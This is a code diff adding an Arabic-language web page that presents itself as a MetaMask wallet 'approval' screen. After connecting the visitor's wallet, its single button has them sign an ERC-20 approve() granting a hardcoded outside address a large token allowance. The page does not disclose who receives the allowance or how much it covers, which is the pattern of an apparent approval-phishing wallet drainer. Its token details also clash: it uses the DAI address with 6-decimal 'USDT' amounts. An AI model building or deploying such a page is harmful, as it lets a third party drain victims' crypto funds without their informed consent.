@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة الموافقة لمحفظة MetaMask</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+    <div class="bg-white p-6 rounded-lg shadow-lg max-w-md w-full text-center">
+        <h1 class="text-2xl font-bold mb-4">ربط محفظة MetaMask</h1>
+        <p id="walletStatus" class="text-gray-600 mb-4">لم يتم ربط المحفظة</p>
+        <button id="connectWallet" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 mb-4">ربط المحفظة</button>
+        <button id="approveButton" class="bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600 hidden">الموافقة على المعاملة</button>
+        <p id="transactionStatus" class="text-gray-600 mt-4"></p>
+    </div>
+
+    <script>
+        const connectWalletButton = document.getElementById('connectWallet');
+        const approveButton = document.getElementById('approveButton');
+        const walletStatus = document.getElementById('walletStatus');
+        const transactionStatus = document.getElementById('transactionStatus');
+
+        // التحقق من وجود MetaMask
+        if (typeof window.ethereum === 'undefined') {
+            walletStatus.textContent = 'يرجى تثبيت MetaMask!';
+            connectWalletButton.disabled = true;
+        } else {
+            // التحقق من الاتصال المسبق
+            window.ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+                if (accounts.length > 0) {
+                    walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
+                    connectWalletButton.classList.add('hidden');
+                    approveButton.classList.remove('hidden');
+                }
+            });
+        }
+
+        // ربط المحفظة
+        connectWalletButton.addEventListener('click', async () => {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
+                connectWalletButton.classList.add('hidden');
+                approveButton.classList.remove('hidden');
+            } catch (error) {
+                walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
+            }
+        });
+
+        // تنفيذ معاملة الموافقة
+        approveButton.addEventListener('click', async () => {
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+
+                // عنوان العقد الذكي لرمز ERC-20 (مثال)
+                const contractAddress = '0x6B175474E89094C44Da98b954EedeAC495271d0F'; // DAI كمثال
+                const recipientAddress = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D'; // عنوان Spender
+                const amount = ethers.utils.parseUnits('100000', 6); // 100,000 USDT (6 منازل عشرية)
+
+                // ABI لدالة الموافقة
+                const abi = [
+                    "function approve(address spender, uint256 amount) public returns (bool)"
+                ];
+
+                const contract = new ethers.Contract(contractAddress, abi, signer);
+                transactionStatus.textContent = 'جاري تنفيذ المعاملة...';
+
+                const tx = await contract.approve(recipientAddress, amount);
+                await tx.wait();
+
+                transactionStatus.textContent = `تمت الموافقة! رقم المعاملة: ${tx.hash}`;
+            } catch (error) {
+                transactionStatus.textContent = 'فشل المعاملة: ' + error.message;
+            }
+        });
+    </script>
+</body>
+</html>
